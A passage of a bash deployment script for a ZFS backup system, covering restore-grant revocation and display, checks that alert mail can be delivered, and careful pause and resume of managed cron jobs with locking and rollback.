    if [ -n "${RESTORE_GRANT_DATASETS:-}" ] && [ -n "${RESTORE_GRANT_ACCOUNT:-}" ]; then
        for _rd_ds in $RESTORE_GRANT_DATASETS; do
            zfs unallow -u "$RESTORE_GRANT_ACCOUNT" "$RESTORE_ZFS_PERMS" -- "$_rd_ds" 2>/dev/null \
                || warn "could not revoke ($RESTORE_ZFS_PERMS) from '$RESTORE_GRANT_ACCOUNT' on '$_rd_ds' -- check 'zfs allow $_rd_ds'"
        done
        log "  revoked:      $RESTORE_ZFS_PERMS from '$RESTORE_GRANT_ACCOUNT'"
    fi

    log "restore grant for '$label' TAKEN BACK (it permitted: ${had:-<unreadable>})"
    log "  the collector for '$label' can no longer write onto this machine."
    return 0
}

do_show_restore() {
    local label="$SHOW_RESTORE_LABEL"
    restore_grant_label_ok "$label" \
        || die "--show-restore='$label' is not a valid relationship label"
    local gpath; gpath="$(restore_grant_path "$label")"
    if [ ! -f "$gpath" ]; then
        echo "RESTORE_GRANT=none"
        echo "  no relationship '$label' may restore onto this machine."
        return 0
    fi
    local modes at by
    modes="$(restore_grant_read_modes "$gpath")" || modes=""
    at="$(sed -n 's/^RESTORE_GRANT_AT="\(.*\)"$/\1/p' "$gpath" 2>/dev/null | head -1)"
    by="$(sed -n 's/^RESTORE_GRANT_BY="\(.*\)"$/\1/p' "$gpath" 2>/dev/null | head -1)"
    echo "RESTORE_GRANT=present"
    echo "  relationship: $label"
    echo "  permits:      ${modes:-<unreadable>}"
    echo "  granted:      ${at:-unknown} by ${by:-unknown}"
    case " ${modes:-} " in
        *" replace "*)
            echo "  WARNING: this grant includes REPLACE -- the collector may destroy data here."
            echo "           It does not expire. Take it back with: $0 --deny-restore=$label" ;;
        *)  echo "  replace:      no" ;;
    esac
    return 0
}

# A GRANT IS A DECISION ABOUT PERMISSIONS, so it dispatches here, beside
# --pause, and not down among the host phases. That is the reviewer's F4 finding
# of 2026-08-26 -- `--commit-scope` answered a permission question and installed
# a capacity-check cron line on a production host on its way past -- applied
# ahead of the same thing happening again.
if [ "$ALLOW_RESTORE_GIVEN" -eq 1 ]; then
    do_allow_restore
    exit $?
fi
if [ "$DENY_RESTORE_GIVEN" -eq 1 ]; then
    do_deny_restore
    exit $?
fi
if [ "$SHOW_RESTORE_GIVEN" -eq 1 ]; then
    do_show_restore
    exit $?
fi

# Placed ABOVE the global root gate on purpose. --show-restore only READS,
# and "is anything allowed to overwrite this machine?" is a question an
# operator must be able to ask without becoming root first. The two verbs
# that CHANGE a grant check for root themselves, and say why they need it --
# which the generic "run as root" below cannot.

[ "$(id -u)" -eq 0 ] || die "run as root"

[ "$CHECK_ONLY" -eq 1 ] && log "CHECK-ONLY mode: nothing will be installed or modified"

# On Proxmox, apt-get update commonly fails on the pve-enterprise repo (401,
# no subscription) even though the other repos succeed. Try a plain install
# first (works if package lists are already cached); only fall back to
# `apt-get update` (tolerating the enterprise-repo failure) if that doesn't
# work. Shared by every package we need below.
apt_install_with_fallback() {
    local pkg="$1"
    apt-get install -y "$pkg" 2>/dev/null && return 0
    warn "plain install of $pkg failed, running apt-get update first (pve-enterprise 401 is expected/harmless here)"
    apt-get update || true
    apt-get install -y "$pkg"
}

# ---- can this host actually DELIVER an alert? ------------------------------
#
# `command -v mail` only proves a client binary exists. Delivery needs an MTA
# behind it, and the two are separate packages: on Proxmox the installer sets
# postfix up for us, which is why this never surfaced here, but a plain Debian
# can end up with mailutils and no working transport at all. A deploy that
# "succeeded" onto a host whose alerts silently go nowhere is the same class of
# failure as a quiesce that returns 0 without freezing anything -- so it gets a
# verdict of its own rather than a warning that scrolls past.
#
# What is deliberately NOT inferred: whether REMOTE delivery works. Debian's
# "Local only" postfix profile sets inet_interfaces=loopback-only, which stops
# it RECEIVING and says nothing about whether it can send outbound -- reading
# main.cf would produce a confident wrong answer. The queue after a real send
# is the only honest signal, and that is what the test-mail path checks.

# The sendmail(8) interface every MTA on Debian provides -- postfix, exim4,
# msmtp-mta, ssmtp, nullmailer. Checked by path, not `command -v`: /usr/sbin is
# not on every PATH this script may be invoked with.
mta_present() {
    [ -x /usr/sbin/sendmail ] || [ -x /usr/lib/sendmail ]
}

# Which one, for the operator who now has to fix it. Best-effort, never fatal.
mta_name() {
    if command -v postconf >/dev/null 2>&1;   then echo postfix
    elif command -v exim4 >/dev/null 2>&1;    then echo exim4
    elif command -v msmtp >/dev/null 2>&1;    then echo msmtp
    elif mta_present;                         then echo "an MTA"
    else                                           echo none
    fi
}

# Messages still waiting. Empty output means "could not tell" -- NOT zero, so a
# caller cannot read an unsupported MTA as proof of an empty queue. That rule
# has to hold when the queue COMMAND fails, too: piping a failed postqueue into
# the awk below used to hit the END{print 0} branch and report a queue nobody
# could inspect as empty (REV-20260806-046 F2), so the exit status is checked
# before any counting happens.
mail_queue_depth() {
    local out
    if command -v postqueue >/dev/null 2>&1; then
        out=$(postqueue -p 2>/dev/null) || return 0
        printf '%s\n' "$out" | awk '/^-- [0-9]+ Kbytes in [0-9]+ Request/ {print $5; f=1} END {if (!f) print 0}'
    elif command -v exim4 >/dev/null 2>&1; then
        exim4 -bpc 2>/dev/null
    fi
}

# One line of verdict, in every mode. This is a PASSIVE audit: it can prove
# negatives (no mail(1), no MTA, mail stuck in the queue, a queue nobody can
# read) but it cannot prove delivery -- only the test-mail probe below observes
# an actual dispatch, and even that only shows the message left THIS host.
# Returns non-zero when the host cannot be shown ready: missing pieces and a
# stuck queue are failures, an unreadable queue is UNVERIFIED and still counts.
# Return 0 means "prerequisites present, nothing queued" -- never "can send"
# (REV-20260806-046 F1: that claim was never in the evidence).
alert_delivery_verdict() {
    if ! command -v mail >/dev/null 2>&1; then
        warn "  ALERTING IS NOT WIRED UP: no 'mail' command. Every backup failure on this host would be silent."
        warn "    fix: apt-get install mailutils   (pulls a default MTA on Debian)"
        return 1
    fi
    if ! mta_present; then
        warn "  ALERTING IS NOT WIRED UP: 'mail' exists but no MTA provides sendmail(8), so nothing can leave this host."
        warn "    fix: apt-get install postfix   (or exim4 / msmtp-mta -- this script deliberately does not choose or configure one for you)"
        return 1
    fi
    local q; q=$(mail_queue_depth)
    case "$q" in ''|*[!0-9]*)
        # Unreadable queue is NOT an empty queue -- and non-numeric garbage is
        # unreadable, not "not greater than zero". Until REV-20260806-046 F2
        # this branch log()ged and returned 0, so a host whose queue could not
        # be inspected at all still ended "audit clean": a verdict derived
        # from missing data, the same fail-open shape as reporting a backup
        # fine because the check itself did not run. warn() feeds PROBLEMS,
        # so --check-only ends non-zero, matching the contract above.
        warn "  alert delivery UNVERIFIED: $(mta_name) present but its queue cannot be inspected here -- dispatch is unproven, not proven"
        warn "    this audit can read postfix (postqueue) and exim4 queues; anything else needs a manual look"
        return 1
    ;; esac
    if [ "$q" -gt 0 ]; then
        warn "  mail transport present ($(mta_name)) but $q message(s) are STUCK IN THE QUEUE -- alerts are being written and not delivered."
        warn "    look: mailq   and   tail -20 /var/log/mail.log"
        return 1
    fi
    # An empty queue proves only that nothing is WAITING. It says nothing
    # about routing, DNS/MX, relay auth or sender acceptance -- outbound 25
    # can be walled off and this branch still runs. "This host can send" was
    # a confident positive derived from the absence of queued work; what the
    # evidence supports is prerequisites-OK, delivery unverified.
    log "  alert delivery: $(mta_name) present, no queued mail -- prerequisites OK; actual delivery UNVERIFIED in this run (--test-mail probes it)"
    return 0
}

# The ACTIVE half of the verdict: submit one real message, then watch the
# local queue. Extracted from the Phase 4 inline block (REV-20260806-046 F3)
# so test/alertmail/run.sh can pin its claims to its evidence. What a drained
# queue proves is BOUNDED: the message left this MTA. A smarthost can still
# bounce it, a recipient can still reject it, a bounce can arrive after the
# three-second look -- so the strongest statement this function may make is
# "local dispatch observed", never end-to-end delivery. Returns non-zero when
# the probe could not submit or the message is still sitting in the queue.
alert_delivery_probe() {
    local email="$1" q_before q_after
    log "sending a test email to probe delivery from THIS host..."
    # Sent directly, NOT through notify-fail.sh: since v4 that only queues, so
    # routing the delivery smoke test through it would prove nothing about mail.
    q_before=$(mail_queue_depth)
    if ! echo "deploy.sh: test delivery from $(hostname -f 2>/dev/null || hostname) at $(date '+%Y-%m-%d %H:%M:%S')" \
        | mail -s "[ZFS BACKUP] test na $(hostname -f 2>/dev/null || hostname)" "$email"; then
        # Until REV-046 the submission was fire-and-forget: mail(1) could exit
        # non-zero and the run still told the operator to go check an inbox.
        warn "  the test message was NOT ACCEPTED: mail(1) exited non-zero -- nothing was submitted, so nothing can arrive"
        warn "    look: tail -20 /var/log/mail.log"
        return 1
    fi
    # Then actually LOOK. Until 2026-08-04 this was fire-and-forget: it told the
    # operator to check an inbox and a log by hand, which on a fresh host is
    # exactly the check nobody performs. A message still queued a few seconds
    # later has not been delivered -- that is not proof of permanent failure
    # (a deferred retry may still succeed), but it is proof that "the mail was
    # sent" is not yet true, and saying so beats implying it is.
    sleep 3
    q_after=$(mail_queue_depth)
    case "$q_after" in
    ''|*[!0-9]*)
        log "check the target inbox ($email) and/or 'tail -20 /var/log/mail.log' to confirm delivery."
        log "  (queue depth could not be read for $(mta_name) -- no verdict on dispatch, only that mail(1) accepted it)"
        ;;
    0)
        log "  local queue empty after the submission -- the message LEFT THIS MTA; recipient delivery is NOT independently verified. Confirm arrival at $email."
        ;;
    *)
        warn "  the test message is STILL QUEUED ($q_after in the queue, ${q_before:-?} before the send) -- it has not been delivered yet"
        warn "    this host can hold mail but has not shown it can send it. Look: mailq / tail -20 /var/log/mail.log"
        warn "    a relayhost/smarthost is the usual missing piece; which relay and whose credentials is a per-host decision this script does not make"
        return 1
        ;;
    esac
    return 0
}

# ==============================================================================
# --pause / --resume: stop every crontab this host manages, for a maintenance
# window where new snapshots are actively unwelcome (hardware work, a live
# migration off this host ahead of it) -- not merely inconvenient. An hour of
# untouched cron on a pvesr-replicated dataset hands pvesr's own
# `zfs send -Rpv | zfs recv -F` cycle a set of foreign snapshots to contend
# with exactly while it is trying to re-establish replication the other way.
#
# Goes through lib-cron.sh's own lock and read-back -- one more requester,
# not a bypass, so it cannot land between a concurrent gen-cron.sh/deploy.sh
# write.
#
# TWO shapes, because "stop the crontab" turned out to mean two different
# things depending on what else lives in it:
#
#   default (block mode)  -- do_pause_blocks_one/do_resume_blocks_one. Only
#     the body of blocks THIS PACKAGE owns (lib-cron.sh's `# BEGIN name` /
#     `# END name` markers -- currently zfs-backup-host, zfs-backup-managed)
#     is commented out, in place, inside the live crontab. A human's own
#     cron lines in the same crontab are never touched, so this is the safe
#     default when the box also runs things we do not own.
#   --fullcron (whole-crontab mode) -- do_pause_one/do_resume_one, unchanged
#     from the first version of this feature. Saves the ENTIRE crontab to
#     $PAUSE_STATE_DIR and replaces it with one placeholder line. Useful when
#     the operator wants NOTHING running for that user, managed or not, but
#     it is destructive to anything unmanaged living in the same crontab for
#     the duration of the window -- hence opt-in, not the default.
#
# The saved state for --fullcron is a plain copy of the crontab exactly as it
# was, not a synthetic reconstruction, so --resume cannot drift from what a
# human would have restored by hand. Block mode needs no such external copy:
# the paused body IS the resume state, sitting right there in the crontab,
# between its own markers.
# ==============================================================================
PAUSE_STATE_DIR="${PAUSE_STATE_DIR:-/root/.zfs-snapshot-all-pause-state}"
# Marker text is now canonically defined in lib-cron.sh (CRON_PAUSE_*), so
# every ordinary crontab writer -- not just deploy.sh -- can recognise a
# paused shape and refuse to silently undo it (REV-20260803-036 F5). Aliased
# here under this file's existing names so nothing below needs to change.
#
# Block mode's in-place markers. The header is detected by prefix only (the
# timestamp after it varies), and is not itself a `# BEGIN`/`# END` line, so
# cron_body_valid never rejects it. The per-line prefix has no space after
# the `#` on purpose: prepending it to ANY existing line -- blank, already a
# `#comment`, or a live cron line -- always yields one valid comment line,
# and stripping the exact same prefix back off is the entire resume logic.
# No cron syntax is ever parsed either way.
PAUSE_MARKER="$CRON_PAUSE_MARKER"
PAUSE_BLOCK_MARKER="$CRON_PAUSE_BLOCK_MARKER"
PAUSE_LINE_PREFIX="$CRON_PAUSE_LINE_PREFIX"

# REV-20260803-036 F4: the ONLY block names --pause's default block mode will
# ever touch, regardless of what lib-cron.sh's marker grammar would otherwise
# accept elsewhere in the crontab. A syntactically valid `# BEGIN name` /
# `# END name` pair is not proof this package wrote it -- a human, an Ansible
# role, certbot, or another local tool can use the exact same shape. Add a
# name here, and ONLY here, the day a future block should become pauseable;
# nothing else may widen this list.
PAUSE_KNOWN_BLOCKS="zfs-backup-host zfs-backup-managed"

# Filter a newline-separated list of block names down to the ones --pause is
# actually allowed to touch (F4). Anything else -- a foreign block that merely
# matches lib-cron.sh's marker grammar -- passes through untouched.
pause_known_names() {   # <names, one per line, via $1>
    local n want
    for n in $1; do
        for want in $PAUSE_KNOWN_BLOCKS; do
            [ "$n" = "$want" ] && { printf '%s\n' "$n"; break; }
        done
    done
}

pause_state_path() { printf '%s/%s.saved' "$PAUSE_STATE_DIR" "$1"; }   # <user>
pause_placeholder_path() { printf '%s/%s.placeholder' "$PAUSE_STATE_DIR" "$1"; }   # <user>

# The same scan Phase 8 uses below to find an already-provisioned delegated
# account when none is named -- so --pause does not require remembering
# --backup-user for an account this run did not just create.
#
# The glob is overridable (default unchanged) so test/pause/run.sh can point
# it at a throwaway path with no matches instead of scanning this machine's
# REAL /home -- found 2026-08-03 running that suite directly on all four
# production hosts: every one of them has a real zfsbackup account, so
# section G's "no account found" scenario silently stopped being exercised
# there (a test-isolation gap, not a functional defect -- confirmed by a
# crontab -l diff that the suite's own crontab(1) stub was still the only
# thing touched).
PAUSE_ACCOUNT_SCAN_GLOB="${PAUSE_ACCOUNT_SCAN_GLOB:-/home/*/zfs-snapshot-all}"
detect_delegated_account() {
    local cand owner
    for cand in $PAUSE_ACCOUNT_SCAN_GLOB; do
        [ -d "$cand" ] || continue
        owner=$(stat -c %U "$(dirname "$cand")" 2>/dev/null) || continue
        id "$owner" >/dev/null 2>&1 && { printf '%s' "$owner"; return 0; }
    done
    return 1
}

# Which crontabs --pause touches: root, always, plus the delegated account --
# named with --backup-user, or detected the same way Phase 8 would. Printed
# one per line rather than returned as an array: this is read with a `while
# read` loop below, which is also what keeps a failure on one user from
# aborting the other.
pause_targets() {
    printf 'root\n'
    local acct="$BACKUP_USER"
    if [ -z "$acct" ]; then acct=$(detect_delegated_account) || true; fi
    if [ -n "$acct" ]; then
        printf '%s\n' "$acct"
    else
        warn "no delegated account found or given (--backup-user=NAME) -- only root's crontab will be paused. If this host has one, name it explicitly."
    fi
}

# --fullcron variant: replaces the WHOLE crontab, see do_pause_blocks_one
# above for the default that touches only our own managed blocks.
#
# REV-20260803-036 F1: the resume copy must be DURABLE before the live
# crontab is touched, never the other way round. The old order wrote the
# placeholder first and only afterward tried to save the original -- an
# unchecked mkdir/mv failure, or a process death in between, blanked the
# crontab with no way back. Here the pre-pause crontab (and the exact
# placeholder text, F3) are written to a temp file INSIDE $PAUSE_STATE_DIR,
# fsync'd, and atomically renamed into place FIRST; only once that has
# succeeded does the live crontab get replaced. A failure at any step before
# the crontab write leaves the crontab byte-identical and returns non-zero. A
# failure of the crontab write itself rolls the just-committed state back off
# disk, so a failed pause never reports (or leaves behind) a claim that the
# user is paused.
do_pause_one() {   # <user>  -> 0 paused, 1 already paused or failed
    local user="$1" state; state=$(pause_state_path "$user")
    local ph_state; ph_state=$(pause_placeholder_path "$user")
    if [ -e "$state" ]; then
        warn "$user: already paused (saved $(stat -c '%y' "$state" 2>/dev/null | cut -d. -f1)) -- run --resume first if you want to re-pause cleanly"
        return 1
    fi
    cron_lock_acquire "$user" || { warn "$user: $CRON_ERR"; return 1; }
    local cur; cur=$(mktemp) || { warn "$user: mktemp failed"; cron_lock_release "$user"; return 1; }
    if ! cron_read "$user" "$cur"; then
        warn "$user: $CRON_ERR"; rm -f "$cur"; cron_lock_release "$user"; return 1
    fi

    mkdir -p "$PAUSE_STATE_DIR" 2>/dev/null
    chmod 700 "$PAUSE_STATE_DIR" 2>/dev/null
    if [ ! -d "$PAUSE_STATE_DIR" ] || [ ! -w "$PAUSE_STATE_DIR" ]; then
        warn "$user: could not create or write to the pause-state directory $PAUSE_STATE_DIR -- crontab left untouched"
        rm -f "$cur"; cron_lock_release "$user"; return 1
    fi
    if [ -L "$state" ] || [ -L "$ph_state" ]; then
        warn "$user: $state or $ph_state is a symlink -- refusing to write through it, crontab left untouched"
        rm -f "$cur"; cron_lock_release "$user"; return 1
    fi

    local placeholder_text
    placeholder_text=$(printf '%s by deploy.sh --pause at %s -- run: deploy.sh --resume' \
        "$PAUSE_MARKER" "$(date '+%Y-%m-%d %H:%M:%S %Z')")
    local tmp_state tmp_ph
    tmp_state=$(mktemp "$PAUSE_STATE_DIR/.${user}.saved.XXXXXX" 2>/dev/null) || {
        warn "$user: mktemp in $PAUSE_STATE_DIR failed -- crontab left untouched"
        rm -f "$cur"; cron_lock_release "$user"; return 1
    }
    tmp_ph=$(mktemp "$PAUSE_STATE_DIR/.${user}.placeholder.XXXXXX" 2>/dev/null) || {
        warn "$user: mktemp in $PAUSE_STATE_DIR failed -- crontab left untouched"
        rm -f "$cur" "$tmp_state"; cron_lock_release "$user"; return 1
    }
    cp "$cur" "$tmp_state" 2>/dev/null
    printf '%s\n' "$placeholder_text" > "$tmp_ph"
    chmod 600 "$tmp_state" "$tmp_ph" 2>/dev/null
    # Best-effort durability: per-file fsync where coreutils supports it (8.24+),
    # falling back to a full sync(2) otherwise. Neither is load-bearing for
    # correctness -- the atomic rename below is -- but a crash right after
    # the rename should not lose data still sitting in the page cache.
    sync "$tmp_state" 2>/dev/null || sync
    sync "$tmp_ph" 2>/dev/null || sync
    if ! cmp -s "$cur" "$tmp_state"; then
        warn "$user: could not durably save the pre-pause crontab -- crontab left untouched"
        rm -f "$cur" "$tmp_state" "$tmp_ph"; cron_lock_release "$user"; return 1
    fi
    if ! mv -f "$tmp_state" "$state" || ! mv -f "$tmp_ph" "$ph_state"; then
        warn "$user: could not commit the saved pause state -- crontab left untouched"
        rm -f "$cur" "$tmp_state" "$tmp_ph" "$state" "$ph_state"; cron_lock_release "$user"; return 1
    fi
    sync "$PAUSE_STATE_DIR" 2>/dev/null || sync

    local placeholder; placeholder=$(mktemp) || {
        warn "$user: mktemp failed -- rolling back the just-saved pause state, nothing paused"
        rm -f "$state" "$ph_state" "$cur"; cron_lock_release "$user"; return 1
    }
    printf '%s\n' "$placeholder_text" > "$placeholder"
    if ! cron_write "$user" "$placeholder"; then
        warn "$user: $CRON_ERR -- rolling back the just-saved pause state; nothing is marked paused. If the crontab now holds partial content from the failed write, check it by hand"
        rm -f "$state" "$ph_state" "$cur" "$placeholder"; cron_lock_release "$user"; return 1
    fi
    rm -f "$cur" "$placeholder"
    cron_lock_release "$user"
    log "$user: crontab paused, saved to $state"
    return 0
}

# Every `# BEGIN name` structurally present in the crontab -- NOT proof of
# ownership. REV-20260803-036 F4: a human, an Ansible role, certbot, or any
# other local tool can legally use the exact same `# BEGIN name`/`# END name`
# shape lib-cron.sh's grammar accepts; "syntactically looks like a block" is
# not evidence this package wrote it. Callers that need to know which of
# these names --pause may actually touch must filter this output through
# pause_known_names().
cron_block_names_present() {   # <file>
    grep -oE '^# BEGIN [A-Za-z0-9._-]+' "$1" | awk '{print $3}' | sort -u
}

# Pause every non-empty, not-already-paused managed block in <user>'s
# crontab -- in ONE crontab write. -> 0 at least one block paused, 1 nothing
# paused/error
#
# REV-20260803-036 F2: the old version called cron_block_install_impl once
# PER BLOCK, so a later block's failure returned non-zero after an earlier
# block had already been committed live -- a partial pause reporting success
# is worse than no pause at all, because the operator believes the whole
# workload stopped. Here every block's new shape is RENDERED locally
# (cron_block_render, which never touches the live crontab) into one scratch
# file, and the live crontab is replaced exactly once, at the end, through
# cron_replace_all_impl. Any failure before that point -- a malformed block,
# a mktemp failure, a render failure -- aborts with the live crontab still
# completely untouched. There is no partial-success state to roll back
# because nothing was written until the single commit.
do_pause_blocks_one() {   # <user>
    local user="$1"
    cron_lock_acquire "$user" || { warn "$user: $CRON_ERR"; return 1; }
    local cur; cur=$(mktemp) || { warn "$user: mktemp failed"; cron_lock_release "$user"; return 1; }
    if ! cron_read "$user" "$cur"; then
        warn "$user: $CRON_ERR"; rm -f "$cur"; cron_lock_release "$user"; return 1
    fi
    if ! cron_markers_valid "$cur"; then
        warn "$user: crontab markers are malformed ($CRON_ERR) -- refusing to pause, resolve by hand"
        rm -f "$cur"; cron_lock_release "$user"; return 1
    fi
    local names; names=$(pause_known_names "$(cron_block_names_present "$cur")")
    if [ -z "$names" ]; then
        rm -f "$cur"; cron_lock_release "$user"
        warn "$user: no managed blocks found -- nothing to pause (use --fullcron if this crontab has unmanaged jobs you also want stopped)"
        return 1
    fi
    local name count=0 first body newbody staged
    for name in $names; do
        if ! cron_block_locate "$cur" "$name"; then
            warn "$user/$name: $CRON_ERR"; rm -f "$cur"; cron_lock_release "$user"; return 1
        fi
        if [ "$CRON_B" -eq 0 ] || [ "$CRON_E" -le $((CRON_B + 1)) ]; then
            log "$user/$name: block is empty, nothing to pause"
            continue
        fi
        first=$(sed -n "$((CRON_B + 1))p" "$cur")
        case "$first" in
            "$PAUSE_BLOCK_MARKER"*)
                warn "$user/$name: already paused -- run --resume first if you want to re-pause cleanly"
                continue ;;
        esac
        body=$(mktemp) || { warn "$user/$name: mktemp failed"; rm -f "$cur"; cron_lock_release "$user"; return 1; }
        sed -n "$((CRON_B + 1)),$((CRON_E - 1))p" "$cur" > "$body"
        newbody=$(mktemp) || { rm -f "$body" "$cur"; warn "$user/$name: mktemp failed"; cron_lock_release "$user"; return 1; }
        {
            printf '%s by deploy.sh --pause at %s -- run: deploy.sh --resume\n' \
                "$PAUSE_BLOCK_MARKER" "$(date '+%Y-%m-%d %H:%M:%S %Z')"
            while IFS= read -r l; do printf '%s%s\n' "$PAUSE_LINE_PREFIX" "$l"; done < "$body"
        } > "$newbody"
        # No cron_body_valid check needed here (unlike the resume side below):
        # every line is either the fixed header or carries $PAUSE_LINE_PREFIX,
        # neither of which can ever match '^# (BEGIN|END) '.
        staged=$(mktemp) || { rm -f "$body" "$newbody" "$cur"; warn "$user/$name: mktemp failed"; cron_lock_release "$user"; return 1; }
        if ! cron_block_render "$cur" "$name" "$newbody" "$staged" ""; then
            warn "$user/$name: could not stage pause: $CRON_ERR"
            rm -f "$body" "$newbody" "$staged" "$cur"; cron_lock_release "$user"; return 1
        fi
        log "$user/$name: staged for pause ($(wc -l < "$body" | tr -d ' ') line(s) to comment out)"
        rm -f "$body" "$newbody" "$cur"
        cur="$staged"
        count=$((count + 1))
    done
    if [ "$count" -eq 0 ]; then
        rm -f "$cur"; cron_lock_release "$user"
        warn "$user: nothing to pause (every managed block is already paused or empty)"
        return 1
    fi
    if ! cron_replace_all_impl "$user" "$cur"; then
        warn "$user: could not commit the pause: $CRON_ERR"
        rm -f "$cur"; cron_lock_release "$user"; return 1
    fi
    rm -f "$cur"
    cron_lock_release "$user"
    log "$user: paused ($count block(s))"
    return 0
}


do_pause() {
    local user rc=0
    while IFS= read -r user; do
        [ -n "$user" ] || continue
        if [ "$FULLCRON_MODE" -eq 1 ]; then
            do_pause_one "$user" || rc=1
        else
            do_pause_blocks_one "$user" || rc=1
        fi
    done < <(pause_targets)
    return "$rc"
}

# --fullcron variant: restores the WHOLE crontab from PAUSE_STATE_DIR, see
# do_resume_blocks_one below for the default that undoes a block-mode pause.
# REV-20260803-036 F3: `grep -qF "$PAUSE_MARKER"` only proved the marker text
# occurred SOMEWHERE in the crontab -- a placeholder with an emergency job
# appended during the window still contained it, and the old code then
# silently discarded that line by installing the saved pre-pause crontab over
# it. The check is now byte-exact against the placeholder text saved
# alongside the state at pause time (F1's ph_state), not a substring search.
do_resume_one() {   # <user>  -> 0 resumed, 1 nothing to resume or failed
    local user="$1" state; state=$(pause_state_path "$user")
    local ph_state; ph_state=$(pause_placeholder_path "$user")
    [ -e "$state" ] || { warn "$user: nothing paused (no saved state at $state)"; return 1; }
    cron_lock_acquire "$user" || { warn "$user: $CRON_ERR"; return 1; }
    local cur; cur=$(mktemp) || { warn "$user: mktemp failed"; cron_lock_release "$user"; return 1; }
    if ! cron_read "$user" "$cur"; then
        warn "$user: $CRON_ERR"; rm -f "$cur"; cron_lock_release "$user"; return 1
    fi
    if [ ! -e "$ph_state" ] || ! cmp -s "$cur" "$ph_state"; then
        warn "$user: the current crontab is not byte-for-byte the exact placeholder --pause wrote -- refusing to overwrite what may be a manual edit made during the maintenance window. The saved pre-pause state is still at $state; compare by hand, then either restore it yourself or remove it once you are sure it is no longer needed."
        rm -f "$cur"; cron_lock_release "$user"; return 1
    fi
    if ! cron_markers_valid "$state"; then
        warn "$user: saved pre-pause crontab at $state fails marker validation ($CRON_ERR) -- refusing to restore a broken layout, resolve by hand"
        rm -f "$cur"; cron_lock_release "$user"; return 1
    fi
    if ! cron_write "$user" "$state"; then
        warn "$user: $CRON_ERR -- saved state left in place at $state, nothing was lost"
        rm -f "$cur"; cron_lock_release "$user"; return 1
    fi
    rm -f "$cur"
    cron_lock_release "$user"
    rm -f "$state" "$ph_state"
    log "$user: crontab resumed from the saved pre-pause state"
    return 0
}

# Undo do_pause_blocks_one in <user>'s crontab: every block whose body still
# starts with $PAUSE_BLOCK_MARKER gets that header line dropped and the
# per-line prefix stripped back off. A block that does not start with the
# marker is left completely alone -- it was never paused, or --fullcron
# replaced the whole crontab instead (in which case there are no `# BEGIN`
# lines here at all and this is a silent no-op, which is correct: do_resume
# below already tries the --fullcron restore for this user separately).
#
# A pass-through line during the loop (something inside the paused block that
# does NOT carry the prefix) means it was added by hand during the window --
# kept as-is rather than dropped, and reported, so a maintenance edit made
# while backups were off never silently vanishes on resume.
#
# REV-20260803-036 F2: same single-commit rebuild as do_pause_blocks_one --
# every block is rendered locally and the live crontab is replaced exactly
# once, through cron_replace_all_impl, so a later block's failure can never
# leave an earlier one resumed and the live crontab in a mixed state.
# -> 0 at least one block resumed, 1 nothing to resume/error
do_resume_blocks_one() {   # <user>
    local user="$1"
    cron_lock_acquire "$user" || { warn "$user: $CRON_ERR"; return 1; }
    local cur; cur=$(mktemp) || { warn "$user: mktemp failed"; cron_lock_release "$user"; return 1; }
    if ! cron_read "$user" "$cur"; then
        warn "$user: $CRON_ERR"; rm -f "$cur"; cron_lock_release "$user"; return 1
    fi
    if ! cron_markers_valid "$cur"; then
        warn "$user: crontab markers are malformed ($CRON_ERR) -- refusing to resume, resolve by hand"
        rm -f "$cur"; cron_lock_release "$user"; return 1
    fi
    local names; names=$(pause_known_names "$(cron_block_names_present "$cur")")
    local name count=0 first newbody staged kept
    for name in $names; do
        if ! cron_block_locate "$cur" "$name"; then
            warn "$user/$name: $CRON_ERR"; rm -f "$cur"; cron_lock_release "$user"; return 1
        fi
        [ "$CRON_B" -gt 0 ] || continue
        [ "$CRON_E" -gt $((CRON_B + 1)) ] || continue
        first=$(sed -n "$((CRON_B + 1))p" "$cur")
        case "$first" in
            "$PAUSE_BLOCK_MARKER"*) : ;;
            *) continue ;;   # not paused by us -- leave it alone
        esac
        newbody=$(mktemp) || { warn "$user/$name: mktemp failed"; rm -f "$cur"; cron_lock_release "$user"; return 1; }
        kept=0
        while IFS= read -r l; do
            case "$l" in
                "$PAUSE_LINE_PREFIX"*) printf '%s\n' "${l#"$PAUSE_LINE_PREFIX"}" ;;
                *) printf '%s\n' "$l"; kept=$((kept + 1)) ;;
            esac
        done < <(sed -n "$((CRON_B + 2)),$((CRON_E - 1))p" "$cur") > "$newbody"
        # A "kept" line came from an operator's hand-edit during the pause
        # window (see above), not from our own prefixing -- it could in
        # principle be its own '# BEGIN'/'# END' line. cron_block_render does
        # not check that (only cron_block_install_impl normally does), so it
        # is checked explicitly here rather than risk staging a body that
        # makes the NEXT block's marker layout ambiguous.
        if ! cron_body_valid "$newbody"; then
            warn "$user/$name: could not stage resume: $CRON_ERR -- the paused block is left in place, nothing lost"
            rm -f "$newbody" "$cur"; cron_lock_release "$user"; return 1
        fi
        staged=$(mktemp) || { rm -f "$newbody" "$cur"; warn "$user/$name: mktemp failed"; cron_lock_release "$user"; return 1; }
        if ! cron_block_render "$cur" "$name" "$newbody" "$staged" ""; then
            warn "$user/$name: could not stage resume: $CRON_ERR -- the paused block is left in place, nothing lost"
            rm -f "$newbody" "$staged" "$cur"; cron_lock_release "$user"; return 1
        fi
        [ "$kept" -eq 0 ] || warn "$user/$name: kept $kept line(s) that were not ours -- looks like a manual edit made during the pause window"
        log "$user/$name: staged for resume"
        rm -f "$newbody" "$cur"
        cur="$staged"
        count=$((count + 1))
    done
    if [ "$count" -eq 0 ]; then
        rm -f "$cur"; cron_lock_release "$user"
        return 1
    fi
    if ! cron_replace_all_impl "$user" "$cur"; then
        warn "$user: could not commit the resume: $CRON_ERR -- the paused block(s) are left in place, nothing lost"
        rm -f "$cur"; cron_lock_release "$user"; return 1
    fi
    rm -f "$cur"
    cron_lock_release "$user"
    log "$user: resumed ($count block(s))"
    return 0
}

do_resume() {
    local f user rc=0 any=0 seen state
    while IFS= read -r user; do
        [ -n "$user" ] || continue
        state=$(pause_state_path "$user")
        if [ -e "$state" ]; then
            any=1
            do_resume_one "$user" || rc=1
        fi
        if do_resume_blocks_one "$user"; then
            any=1
        fi
    done < <(pause_targets)
    # A --fullcron pause survives even if --backup-user/detection would name a
    # different account by the time --resume runs (or the account is gone) --
    # its saved-state file is the only record of who was paused, so any file
    # pause_targets did not already cover above still gets a chance here.
    if [ -d "$PAUSE_STATE_DIR" ]; then
        seen=$(pause_targets)
        for f in "$PAUSE_STATE_DIR"/*.saved; do
            [ -e "$f" ] || continue
            user=$(basename "$f" .saved)
            printf '%s\n' "$seen" | grep -qxF "$user" && continue
            any=1
            do_resume_one "$user" || rc=1
        done
    fi
